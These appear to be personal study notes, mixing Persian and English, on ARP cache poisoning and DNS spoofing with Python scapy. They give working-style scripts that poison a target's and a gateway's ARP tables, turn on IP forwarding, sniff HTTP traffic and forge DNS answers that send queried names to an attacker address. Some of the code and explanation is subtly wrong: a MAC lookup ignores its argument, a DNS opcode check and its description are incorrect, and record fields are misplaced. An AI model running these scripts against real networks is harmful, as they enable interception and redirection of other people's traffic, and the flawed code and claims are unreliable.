

## ARP Poisening

```python
from scapy.all import *

def get_mac(ip):

    pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="10.21.143.232")
    ans,unasn = srp(pkt,timeout=2,retry=10)   # srp function for sen packet in 2 layer
    
```

![[Pasted image 20260605174857.png]]

به این شکل میتونیم نحوه ادرس دهی رو مشخص کنیم و src که مد نظرمون هست رو بدست بیاریم mac address رو 
![[Pasted image 20260605174948.png]]


```python
from scapy.all import *
conf.verb = 0

def poisen_arp(target_ip,target_mac,gateway_ip,gateway_mac):
    print("[+] Start Poisening.....")
    while True:
        send(ARP(op=2,psrc=,pdst=,hwdst=))   # Generate ARP Replay on DST ---> GatewayIP GatewayMAC
def get_mac(ip):

    pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="10.21.143.232")
    ans,unasn = srp(pkt,timeout=2,retry=10)   # srp function for sen packet in 2 layer
    return ans[0][1][Ether].src

target_ip = '10.21.143.207'
gateway_ip = '10.21.143.232'

target_mac = get_mac(target_ip)
gateway_mac = get_mac(gateway_ip)

print('[+] TargetMac ',target_mac)
print('[+] Gateway MAC ',gateway_mac)



# OP ---> Opcode = req OR Replay
# Opcode 1 ---> Request
#Opcode 2 ---> Replay

# hwsrc= ---> this is method is empty becase we can src mac is equal my srcmac

```

هموطنور که توضیح داده شده ما میایم اون قسمت hwsrc رو خالی میزاریم به این خاطر که اگر خالی باشه به صورت پیش فرض mac خودمون رو قراره میده  و میتونیم بیایم و به targetIP بگیم ادرس mac Gateway خودمون هستیم پس این فیلد رو برمیداریم 

فیلد psrc هم برابر میشه با IP gateway یعنی این پکت اینکار از سمت gateway درخواست شده به سمت targetip 

## Final Demo


```python
from scapy.all import *
import time
import threading
conf.verb = 0

def poisen_arp(target_ip,target_mac,gateway_ip,gateway_mac):
    print("[+] Start Poisening.....")
    while True:
        send(ARP(op=2,psrc=gateway_ip,pdst=target_ip,hwdst=target_mac,))   # Generate ARP Replay on DST ---> GatewayIP GatewayMAC
        send(ARP(op=2,psrc=target_ip,pdst=gateway_ip,hwdst=gateway_mac))
        time.sleep(2)
def get_mac(ip):

    pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="10.21.143.232")
    ans,unasn = srp(pkt,timeout=2,retry=10)   # srp function for sen packet in 2 layer
    return ans[0][1][Ether].src

target_ip = '10.21.143.207'
gateway_ip = '10.21.143.232'

target_mac = get_mac(target_ip)
gateway_mac = get_mac(gateway_ip)

print('[+] TargetMac ',target_mac)
print('[+] Gateway MAC ',gateway_mac)

t = threading.Thread(target=poisen_arp,args=(target_ip,target_mac,gateway_ip,gateway_mac,))
t.start()

while True:
    time.sleep(1)
# OP ---> Opcode = req OR Replay
# Opcode 1 ---> Request
#Opcode 2 ---> Replay

# hwsrc= ---> this is method is empty becase we can src mac is equal my srcmac
```


### Before ARP Table 

![[Pasted image 20260605181344.png]]

![[Pasted image 20260605181434.png]]


### After

![[Pasted image 20260605181444.png]]



## ARP Poisening & Sniff Traffic

##### convert system to the Router
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
```

```python
from scapy.all import *
import time
import threading
conf.verb = 0


def arp_sniff(pkt):
    print(pkt.summary())
    
def poisen_arp(target_ip,target_mac,gateway_ip,gateway_mac):
    print("[+] Start Poisening.....")
    while True:
        send(ARP(op=2,psrc=gateway_ip,pdst=target_ip,hwdst=target_mac,))   # Generate ARP Replay on DST ---> GatewayIP GatewayMAC
        send(ARP(op=2,psrc=target_ip,pdst=gateway_ip,hwdst=gateway_mac))
        time.sleep(2)
def get_mac(ip):

    pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="10.21.143.232")
    ans,unasn = srp(pkt,timeout=2,retry=10)   # srp function for sen packet in 2 layer
    return ans[0][1][Ether].src

target_ip = '10.21.143.207'
gateway_ip = '10.21.143.232'

target_mac = get_mac(target_ip)
gateway_mac = get_mac(gateway_ip)

print('[+] TargetMac ',target_mac)
print('[+] Gateway MAC ',gateway_mac)

t = threading.Thread(target=poisen_arp,args=(target_ip,target_mac,gateway_ip,gateway_mac,))
t.start()
sniff(filter="tcp port 80",prn=arp_sniff)
while True:
    time.sleep(1)
# OP ---> Opcode = req OR Replay
# Opcode 1 ---> Request
#Opcode 2 ---> Replay

# hwsrc= ---> this is method is empty becase we can src mac is equal my srcmac
```


![[Pasted image 20260605194247.png]]


---

#### DNS Poisening 


![[DNS-primer.pdf]]


![[Pasted image 20260605200539.png]]

دقت داشته باشین که تو هدر های DNS  اگر opcode برابر با 1 باشه یعنی یه responce هست و اگر opcode 
برابر با 0 باشه یعنی یه query هستش 

پس از بخش qr میتونیم مشخص کنیم که دنبال چه opcode هستیم 

یه بخش دیگری هم هدر dns داره تحت عنوان qd که میتونیم از بخش و بخش qname به اون hostname یعنی domain برسیم و ببینیم به کجا req زده بریم باهم این بخشش هم pars کنیم 

```python
from scapy.all import *
import time
import threading

def handle_packet(pkt):

    ip = pkt.getlayer(IP)
    dns = pkt.getlayer(DNS)
    udp = pkt.getlayer(UDP)
    if (dns.qr == 0 and dns.opcode == 1):
        query_host = dns.qd.qname
        print(dns,query_host)

sniff(filter="udp port 53",prn=handle_packet)
```

![[Pasted image 20260605201416.png]]



![[Pasted image 20260605201522.png]]



خب پس ما تا اینجای کار اومیدم یک فیلتری نوشتیم که میاد برای ما پکت های dns که از جنس question یا query هستن رو گرفتیم و یه فیلتر روش اعمال کردیم 
بریم تو مرحله یه پکت DNS بسازیم و به اون کلاینت که پکت ارسال کرده جواب بدیم 
اون جوابی که بهش میدیم شامل اون IP Address هست که ما مد نظرمونه 


![[Pasted image 20260605202952.png]]


#### Final Demo  DNS Poisening & IP Aspoofing 

```python
from scapy.all import *
import time
import threading

def handle_packet(pkt):

    ip = pkt.getlayer(IP)
    dns = pkt.getlayer(DNS)
    udp = pkt.getlayer(UDP)
    if (dns.qr == 0 and dns.opcode == 1):
        query_host = dns.qd.qname

        dns_replay = IP(src=ip.dst,dst=ip.src)/ \
        UDP(sport=udp.dport,dport=udp.sport)/ \
        DNS(id=dns.id,qr=1,aa=0,rcode=0,qd=dns.qd,an=DNSRR(rrname=query_host),ttl=12,type="A",rclass="IN",rdata="192.168.43.100")
        print("[+] Send %s has %s to %s"%(query_host,"192.168.43.100",ip.src))
        send(dns_replay)
sniff(filter="udp port 53",prn=handle_packet)

# rdata ---> my ip for responce that dns

```


![[Pasted image 20260605203435.png]]


![[Pasted image 20260605203509.png]]


اول باید کد مربوط به ARP رو اجرا کنیم تا بیاد مارو به عنوان gateway نشون بده و تو مرحله بعدی بیایم کد dns خودمون رو اجرا کنیم تا بتونیم خودمون درخواست رو به نوعی spoof کنیم 